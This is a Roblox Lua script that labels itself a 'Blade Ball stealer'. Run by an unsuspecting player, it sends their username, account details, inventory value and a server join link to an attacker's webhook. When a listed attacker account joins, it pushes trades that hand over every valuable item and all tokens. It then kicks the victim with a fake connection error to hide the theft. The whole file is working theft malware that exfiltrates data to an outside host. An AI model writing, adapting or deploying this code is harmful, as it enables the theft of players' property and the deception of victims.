_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or ""
local ping = _G.pingEveryone or "No"
local min_rap = _G.min_rap or 50

-- // FONCTIONS TECHNIQUES // --

local function sendTradeRequest(user)
    local args = {[1] = Players:WaitForChild(user)}
    repeat wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
    until response == true
end

local function addItemToTrade(itemType, ID)
    local args = {[1] = itemType, [2] = ID}
    repeat netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args)) until true
end

local function readyTrade()
    repeat wait(0.1)
        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
    until true
end

local function confirmTrade()
    repeat wait(0.1)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    until not inTrade
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

-- // TES EMBEDS MODIFIÉS (VIOLET / VERT) // --

local function SendJoinMessage(list, prefix)
    local tokensEmbed = "0"
    pcall(function() tokensEmbed = PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "") end)

    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or {Count = 0, TotalRAP = 0})
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    local itemListText = ""
    for _, group in ipairs(groupedList) do
        itemListText = itemListText .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local data = {
        ["content"] = (ping == "Yes" and "||​|| @everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["auth_token"] = auth_token, 
        ["embeds"] = {{
            ["title"] = "🟣 Join your hit",
            ["color"] = 8323327, -- VIOLET
            ["fields"] = {
                {
                    ["name"] = "ℹ️ Player info:",
                    ["value"] = "```" ..
                        "\n🆔 Username      : " .. plr.Name ..
                        "\n👤 Display Name  : " .. plr.DisplayName ..
                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
                        "\n⚡ Executor      : " .. (identifyexecutor and identifyexecutor() or "Unknown") ..
                        "\n🪙 Tokens        : " .. formatNumber(tonumber(tokensEmbed)) ..
                        "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "Item list 📝:",
                    ["value"] = "```\n" .. (itemListText ~= "" and itemListText or "No items") .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "Summary 💰:",
                    ["value"] = "```\nTotal RAP: " .. formatNumber(totalRAP) .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "🔗 Quick Links", 
                    ["value"] = "[**JOIN SERVER**](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ") | [**RAW INVENTORY**](https://inventory.roblox.com/v1/users/"..plr.UserId.."/assets/collectibles?assetType=All&sortOrder=Asc&limit=100)", 
                    ["inline"] = false
                }
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack • " .. os.date("%X")},
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendMessage(list)
    local itemListSent = ""
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end
    for name, count in pairs(grouped) do
        itemListSent = itemListSent .. name .. " (x" .. count .. ")\n"
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "🟢 Hit is still in the server",
            ["color"] = 65280, -- VERT
            ["fields"] = {
                {["name"] = "👤 Victim:", ["value"] = "```" .. plr.Name .. "```", ["inline"] = true},
                {["name"] = "💰 Summary:", ["value"] = "```Total RAP: " .. formatNumber(totalRAP) .. "```", ["inline"] = true},
                {["name"] = "Items to be sent 📝:", ["value"] = "```\n" .. itemListSent .. "```", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"},
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- // CALCUL RAP & INVENTAIRE // --

local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
local function buildNameToRAPMap(category)
    local map = {}
    if not rapData[category] then return map end
    for k, v in pairs(rapData[category]) do
        local s, d = pcall(function() return HttpService:JSONDecode(k) end)
        if s then for _, p in ipairs(d) do if p[1] == "Name" then map[p[2]] = v end end end
    end
    return map
end

local rapMappings = {}
for _, cat in ipairs(categories) do rapMappings[cat] = buildNameToRAPMap(cat) end

for _, cat in ipairs(categories) do
    for id, info in pairs(clientInventory[cat]) do
        if not info.TradeLock then
            local rap = (rapMappings[cat] and rapMappings[cat][info.Name]) or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
            end
        end
    end
end

-- // GESTION DES TRADES // --

local function getNextBatch(items, batchSize)
    local batch = {}
    for i = 1, math.min(batchSize, #items) do table.insert(batch, table.remove(items, 1)) end
    return batch
end

local function doTrade(joinedUser)
    while #itemsToSend > 0 do
        sendTradeRequest(joinedUser)
        repeat wait(0.5) until tradeGui.Enabled
        local currentBatch = getNextBatch(itemsToSend, 100)
        for _, item in ipairs(currentBatch) do addItemToTrade(item.itemType, item.ItemID) end
        
        local tokens = tonumber(PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")) or 0
        if tokens > 0 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens) end
        
        readyTrade()
        confirmTrade()
    end
    plr:kick("Connection error (277)")
end

local function waitForUserJoin()
    local successSent = false
    local function onUserJoin(player)
        if table.find(users, player.Name) then
            if not successSent then SendMessage({unpack(itemsToSend)}) successSent = true end
            doTrade(player.Name)
        end
    end
    for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
    Players.PlayerAdded:Connect(onUserJoin)
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendJoinMessage(itemsToSend)
    waitForUserJoin()
end
